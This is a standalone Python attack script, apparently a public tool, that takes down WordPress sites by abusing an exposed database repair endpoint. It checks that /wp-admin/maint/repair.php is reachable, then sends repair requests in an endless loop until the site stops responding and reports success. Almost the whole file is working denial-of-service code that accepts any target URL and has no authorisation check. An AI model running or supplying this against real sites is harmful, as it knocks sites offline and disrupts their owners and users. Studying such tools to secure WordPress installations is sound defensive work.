#!/usr/bin/env python3
import sys
import time
import requests
from urllib.parse import urljoin
from datetime import datetime

print('''
    ██╗    ██╗██████╗ ███████╗ ██████╗██╗  ██╗ █████╗ ██╗██████╗       ██████╗ ██████╗ 
    ██║    ██║██╔══██╗██╔════╝██╔════╝██║ ██╔╝██╔══██╗██║██╔══██╗      ██╔══██╗██╔══██╗
    ██║ █╗ ██║██████╔╝█████╗  ██║     █████╔╝ ███████║██║██████╔╝█████╗██║  ██║██████╔╝
    ██║███╗██║██╔══██╗██╔══╝  ██║     ██╔═██╗ ██╔══██║██║██╔══██╗╚════╝██║  ██║██╔══██╗
    ╚███╔███╔╝██║  ██║███████╗╚██████╗██║  ██╗██║  ██║██║██║  ██║      ██████╔╝██████╔╝
    ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝      ╚═════╝ ╚═════╝
    Authored by : @smaranchand | https://smaranchand.com.np
      ''')
# Print usage instructions if the script is not used properly
def print_usage():
    print("Usage: wreckair-db.py vulnerablewebsite.com")
    sys.exit(1)

# Validate URL to ensure it has a proper scheme (http or https)
def validate_url(url):
    """Validates if the provided URL has a valid scheme and netloc."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# Check if the site is up by sending a GET request to the provided URL
def check_site_status(url):
    try:
        response = requests.get(url, timeout=7)
        return response.status_code == 200
    except requests.RequestException:
        return False

# Check if the repair endpoint (/wp-admin/maint/repair.php) exists and is vulnerable
def check_repair_endpoint(url):
    repair_endpoint = urljoin(url, "/wp-admin/maint/repair.php")
    try:
        response = requests.get(repair_endpoint, timeout=7)
        # Check if the response contains the expected text "Repair Database"
        if response.status_code == 200 and "Repair Database" in response.text:
            print(f"[INFO] DB Repair endpoint is available and ready.")
            return True
        else:
            print(f"[WARNING] DB Repair endpoint is not available.")
            return False
    except requests.RequestException:
        print(f"[INFO] Could not DB repair endpoint, Site might be already down.")
        return False

# Continuously send requests to the repair endpoint to make the site busy
def make_site_busy(url):
    busy_url = urljoin(url, "/wp-admin/maint/repair.php?repair=1")
    start_time = datetime.now()
    print(f"[INFO] Starting DB repair test on: {url}")
    try:
        while True:
            try:
                # Send a GET request to the repair endpoint
                response = requests.get(busy_url, timeout=7)
                elapsed_time = datetime.now() - start_time
                elapsed_seconds = elapsed_time.total_seconds()
                # Print message if the request succeeds, meaning the site is still up
                if response.status_code == 200:
                    print(f"[INFO] Site is still responding. (Elapsed time: {elapsed_seconds:.2f} seconds)")
            except requests.RequestException:
                elapsed_time = datetime.now() - start_time
                elapsed_seconds = elapsed_time.total_seconds()
                # Print success message when the site is down
                print(f"[SUCCESS] Voilà! The site appears to be down. (Elapsed time: {elapsed_seconds:.2f} seconds)")
                time.sleep(8)  # Adjust the sleep time as needed to control the request frequency
    except KeyboardInterrupt:
        # Handle keyboard interrupt and print total elapsed time
        total_elapsed_time = datetime.now() - start_time
        total_elapsed_seconds = total_elapsed_time.total_seconds()
        print(f"\n[INFO] Stopped by user. Total elapsed time: {total_elapsed_seconds:.2f} seconds")
# Main function to execute the script logic
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_usage()

    target = sys.argv[1]
    target = validate_url(target)

    # Check if the target site is up before proceeding
    if check_site_status(target):
        # Check if the repair endpoint is available before performing DB repair
        if check_repair_endpoint(target):
            make_site_busy(target)
        else:
            print(f"[EXIT] Cannot proceed with test.")
    else:
        print(f"[INFO] The site {target} already appears to be down.")
